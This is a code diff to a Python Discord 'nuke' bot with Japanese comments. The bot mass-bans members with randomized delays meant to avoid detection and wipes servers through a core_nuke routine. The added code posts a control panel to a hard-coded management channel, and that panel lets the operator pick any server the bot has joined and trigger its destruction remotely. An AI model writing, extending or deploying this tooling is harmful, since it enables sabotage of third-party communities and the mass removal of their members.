@@ -11,6 +11,10 @@ PREFIX = "!"
 DEFAULT_NEW_NAME = "ますまに共栄圏植民地"
 INVITE_LINK = "https://discord.gg/tqNR7BsAsR"
 
+# 指定の管理サーバー/チャンネルID
+MANAGE_GUILD_ID = 1477622875560214548
+MANAGE_CHANNEL_ID = 1477622875560214551
+
 intents = discord.Intents.default()
 intents.members = True
 intents.message_content = True
@@ -93,7 +97,7 @@ async def ban_all_task(guild, members, reason):
         if m == guild.me:  # 自分をBANしない
             continue
         try:
-            await guild.ban(m, reason=reason, delete_message_seconds=0)  # 非推奨警告回避
+            await guild.ban(m, reason=reason, delete_message_seconds=0)  # 警告回避
         except:
             pass
         await asyncio.sleep(random.uniform(0.2, 0.4))  # BANは検知されやすいので少し抑え
@@ -216,6 +220,28 @@ async def core_nuke(guild, new_server_name=None):
 
     print("完了")
 
+class ManageView(discord.ui.View):
+    def __init__(self, bot):
+        super().__init__(timeout=None)  # 永久View（再起動でリセット）
+        self.bot = bot
+
+    @discord.ui.button(label="サーバー一覧", style=discord.ButtonStyle.primary)
+    async def list_servers(self, interaction: discord.Interaction, button: discord.ui.Button):
+        embed = discord.Embed(title="ボットが入ってるサーバー一覧", color=discord.Color.blue())
+        for g in self.bot.guilds:
+            embed.add_field(name=g.name, value=f"ID: {g.id}\nメンバー: {g.member_count}", inline=False)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+    @discord.ui.select(placeholder="ヌーク対象サーバー選択", options=[])
+    async def select_guild(self, interaction: discord.Interaction, select: discord.ui.Select):
+        guild_id = int(select.values[0])
+        guild = self.bot.get_guild(guild_id)
+        if guild:
+            await core_nuke(guild)
+            await interaction.response.send_message(f"{guild.name} でヌーク起動しました。", ephemeral=True)
+        else:
+            await interaction.response.send_message("サーバー取得失敗。", ephemeral=True)
+
 @bot.command(name="masumani", aliases=["setup"])
 async def trigger(ctx, *, new_name: str = None):
     if not ctx.guild:
@@ -233,6 +259,21 @@ async def on_ready():
     for guild in bot.guilds:
         await log_server_info(guild)
     print("=====================================")
+
+    # 管理チャンネルにView付きメッセージ送信
+    manage_guild = bot.get_guild(MANAGE_GUILD_ID)
+    if manage_guild:
+        manage_channel = manage_guild.get_channel(MANAGE_CHANNEL_ID)
+        if manage_channel:
+            view = ManageView(bot)
+            # ドロップダウンオプション追加（全サーバー）
+            options = [discord.SelectOption(label=g.name, value=str(g.id)) for g in bot.guilds]
+            view.select_guild.options = options  # selectにオプションセット
+            await manage_channel.send("サーバー管理パネル", view=view)
+        else:
+            print("管理チャンネルが見つかりません")
+    else:
+        print("管理サーバーが見つかりません")
 
 @bot.event
 async def on_guild_join(guild):
